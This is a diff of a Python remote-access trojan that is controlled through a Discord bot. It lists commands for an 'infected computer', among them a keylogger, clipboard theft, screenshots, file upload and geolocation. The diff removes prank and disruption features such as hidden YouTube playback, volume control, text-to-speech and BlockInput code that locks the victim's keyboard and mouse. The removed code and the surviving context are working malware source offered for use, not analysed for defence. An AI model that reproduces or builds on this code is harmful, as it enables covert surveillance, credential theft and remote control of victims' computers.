@@ -33,19 +33,15 @@ Availaible commands are :
 --> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
 --> !cd = Changes directory
 --> !write = Type your desired sentence on infected computer
---> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
+
 --> !clipboard = Retrieve infected computer clipboard content
 --> !geolocate = Geolocate computer using latitude and longitude of the ip address with google map / Warning : Geolocating IP addresses is not very precise
 --> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
 --> !stopkeylogger = Stops keylogger
 --> !dumpkeylogger = Dumps the keylog
---> !volumemax = Put volume at 100%
---> !volumezero = Put volume at 0%
+
 --> !idletime = Get the idle time of user
---> !sing = Play chosen video in background (Only works with youtube links)
---> !stopsing = Stop video playing in background
---> !blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
---> !unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
+
 --> !screenshot = Get the screenshot of the user's current screen
 --> !exit = Exit program
 --> !kill = Kill a session or all sessions except current one / Syntax = "!kill session-3" or "!kill all"
@@ -336,10 +332,6 @@ async def on_message(message):
                 user32.CloseClipboard()
                 await message.channel.send(f"[*] Clipboard content is : {body}")
 
-        if message.content.startswith("!stopsing"):
-            import os 
-            os.system(f"taskkill /F /IM {pid_process[1]}")
-
         if message.content == "!sysinfo":
             import platform
             info = platform.uname()
@@ -449,35 +441,6 @@ async def on_message(message):
                 print("failed")
                 await message.channel.send("[*] Command failed : User not in administrator group")
 
-        if message.content.startswith("!sing"): # This is awfully complicated for such a dumb command I don't know why I wasted time doing this.
-            volumeup()
-            from win32 import win32gui
-            import win32con
-            import win32gui
-            from win32con import SW_HIDE
-            import win32process
-            import os
-            link = message.content[6:]
-            if link.startswith("http"):
-                link = link[link.find('www'):]
-            os.system(f'start {link}')
-            while True:
-                def get_all_hwnd(hwnd,mouse):
-                    def winEnumHandler(hwnd, ctx):
-                        if win32gui.IsWindowVisible(hwnd):
-                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
-                                win32gui.ShowWindow(hwnd, SW_HIDE)
-                                global pid_process
-                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
-                                return "ok"
-                        else:
-                            pass
-                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
-                        win32gui.EnumWindows(winEnumHandler,None)
-                try:
-                    win32gui.EnumWindows(get_all_hwnd, 0)
-                except:
-                    break
 
         if message.content == "!startkeylogger":
             import base64
@@ -529,33 +492,6 @@ async def on_message(message):
             duration = get_idle_duration()
             await message.channel.send('User idle for %.2f seconds.' % duration)
             import time
-            time.sleep(1)
-
-        if message.content.startswith("!voice"):
-            volumeup()
-            import comtypes
-            import win32com.client as wincl
-            speak = wincl.Dispatch("SAPI.SpVoice")
-            speak.Speak(message.content[7:])
-            comtypes.CoUninitialize()
-            await  message.channel.send("[*] Command successfully executed")
-
-        if message.content.startswith("!blockinput"):
-            import ctypes
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            if is_admin == True:
-                ok = windll.user32.BlockInput(True)
-                await message.channel.send("[*] Command successfully executed")
-            else:
-                await message.channel.send("[!] Admin rights are required for this operation")
-
-        if message.content.startswith("!unblockinput"):
-            import ctypes
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            if is_admin == True:
-                ok = windll.user32.BlockInput(False)
-                await  message.channel.send("[*] Command successfully executed")
-            else:
-                await message.channel.send("[!] Admin rights are required for this operation")
+            time.sleep(1)    
 
 client.run(token)
